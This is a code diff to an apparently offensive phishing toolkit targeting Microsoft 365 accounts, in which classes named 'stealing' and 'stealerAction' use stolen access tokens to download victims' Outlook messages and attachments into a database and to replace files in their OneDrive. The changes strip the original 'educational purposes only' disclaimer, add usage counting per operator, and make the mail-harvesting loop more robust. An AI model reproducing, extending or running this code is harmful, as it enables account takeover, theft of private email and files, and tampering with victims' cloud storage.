@@ -1,22 +1,6 @@
-# Copyright (C) 2022 Raunak Parmar, @trouble1_raunak
-# All rights reserved to Raunak Parmar
 
-# This program is free software: you can redistribute it and/or modify
-# it under the terms of the GNU General Public License as published by
-# the Free Software Foundation, either version 3 of the License, or
-# (at your option) any later version.
 
-# This program is distributed in the hope that it will be useful,
-# but WITHOUT ANY WARRANTY; without even the implied warranty of
-# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
-# GNU General Public License for more details.
-
-# You should have received a copy of the GNU General Public License
-# along with this program. If not, see <http://www.gnu.org/licenses/>.
-
-# This tool is meant for educational purposes only. 
-# The creator takes no responsibility of any mis-use of this tool.
-
+from concurrent.futures import thread
 from datetime import date
 import adal, json, time, requests, os, threading, sys
 from flask_login import current_user
@@ -99,6 +83,9 @@ class stealing():
 
 
     def apiCall(uuid, url, method, contentType, data, accessToken):
+        admin = Admin.query.filter_by(id=uuid).first()
+        admin.azureUsage = admin.azureUsage + 1
+        db.session.commit()
         delay = StealerConfig.query.filter_by(uuid=uuid).first()
         if delay == None:
             delay = 0
@@ -192,7 +179,10 @@ class stealing():
 
 
     def attachments(uuid, Id, receiver, From, HasAttachments, date, accessToken):
-        
+        try:
+            receiver = str(receiver[0]['emailAddress']['address'])
+        except:
+            receiver = ""
         if HasAttachments == "True":
             uri = "/me/mailfolders/inbox/messages/" + Id + "/attachments"
             response = stealing.apiCall(uuid, uri, "GET", None, "", accessToken).json()
@@ -204,7 +194,7 @@ class stealing():
                     fileSize = str(size(len(base64.b64decode(content_raw)))) + str("B")
                     signature = hashlib.sha256(content_base64.encode('utf-8')).hexdigest()
                     insertAttachments = Attachments(uuid=uuid,id=Id, 
-                                                    receiver=str(receiver[0]['emailAddress']['address']),
+                                                    receiver=receiver,
                                                     sender = From,
                                                     data=str(content_base64),
                                                     filename= str(attachment_name),
@@ -216,7 +206,6 @@ class stealing():
                     
                     log = ('<br><span style="color:#7FFFD4">'+str(attachment_name)+'</span>')
                     db.session.add(phishingLogs(uuid=uuid, message=log))
-                    db.session.commit()
 
                 except Exception as e:
                     print(e) 
@@ -228,7 +217,6 @@ class stealing():
             except Exception as e:
                 db.session.rollback()
                 print(e)
-                pass        
 
 
     def outlook(uuid, accessToken, victim, endpoint):
@@ -258,10 +246,13 @@ class stealing():
                 Flag           = str(data['flag']['flagStatus'])
                 HasAttachments = str(data['hasAttachments'])
                 Id             = str(data['id'])
-                
+                try:
+                    Recipients = str(ToRecipients[0]['emailAddress']['address'])
+                except:
+                    Recipients = ""  
                 insertMails = Outlook(uuid=uuid,
                                         id=Id,
-                                        username=str(ToRecipients[0]['emailAddress']['address']),
+                                        username=Recipients,
                                         victim= victim,
                                         Body = Body,
                                         bodyPreview= bodyPreview,
@@ -277,13 +268,14 @@ class stealing():
                                         )
                 db.session.add(insertMails)
                 
-                stealing.attachments(uuid, Id, ToRecipients, From, HasAttachments, sentDateTime, accessToken)                                
+                stealing.attachments(uuid, Id, ToRecipients, From, HasAttachments, sentDateTime, accessToken)
                 
             except Exception as e:
                 # LOGGING
+                print(e, Id)
                 log = ('<br><span style="color:red">[-] Outlook: '+str(e)+'</span>')
                 db.session.add(phishingLogs(uuid=uuid, message=log))
-                
+                db.session.commit()
                 return
         try:
             db.session.commit()
@@ -545,7 +537,7 @@ class stealerAction():
 
 
     def replaceOneDriveFile(uuid, username, id, name, content):
-        accessToken = stealerAction.getAccessToken(username)
+        accessToken = stealerAction.getAccessToken(uuid, username)
         content_b64 = str(base64.b64encode(content).decode('ascii'))
         sig = hashlib.sha256(content_b64.encode('utf-8')).hexdigest()
         jsonBody = '{ "name": "%s" }' % name
